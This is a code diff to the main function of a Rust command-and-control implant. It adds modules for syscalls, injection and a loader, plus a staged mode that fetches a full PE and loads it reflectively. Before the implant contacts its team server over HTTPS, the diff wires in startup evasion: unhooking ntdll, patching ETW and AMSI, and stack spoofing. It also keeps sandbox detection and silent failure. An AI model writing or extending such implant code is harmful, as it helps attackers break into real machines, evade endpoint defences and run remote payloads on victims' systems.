@@ -18,6 +18,9 @@ mod crypto;
 mod evasion;
 mod executor;
 mod task;
+mod syscall;
+mod inject;
+mod loader;
 
 use std::time::Duration;
 
@@ -43,8 +46,23 @@ fn make_channel() -> Box<dyn channel::Channel> {
     Box::new(channel::https::HttpsChannel::new(C2_HOST, C2_PORT))
 }
 
+// In staged-payload+udrl builds, do_staged_load() diverges so everything after it
+// is unreachable. This is intentional: the stager never runs the agent main loop.
+#[allow(unreachable_code)]
 fn main() {
-    // Run pre-flight evasion checks before doing anything visible
+    // Staged-payload mode: fetch full PE and reflectively load it; never returns.
+    #[cfg(all(target_os = "windows", feature = "staged-payload", feature = "udrl"))]
+    loader::do_staged_load();
+
+    #[cfg(all(target_os = "windows", not(all(feature = "staged-payload", feature = "udrl"))))]
+    let _ = crate::syscall::init();
+
+    // Evasion startup patches — applied before registration so they're in place
+    // before any network contact. Order: unhook first (restores clean syscall stubs),
+    // then ETW/AMSI (patches in-memory, depends on correct ntdll state), then
+    // stack-spoof init (scans ntdll for gadget).
+    evasion::startup_patches();
+
     if evasion::abort_if_sandboxed() {
         return;
     }
@@ -52,7 +70,7 @@ fn main() {
     let mut ch = make_channel();
 
     // Register with the team server and get session credentials
-    let session = match register(&mut ch) {
+    let session = match register(&mut *ch) {
         Ok(s) => s,
         Err(_) => return, // silent failure — no output, no crash
     };
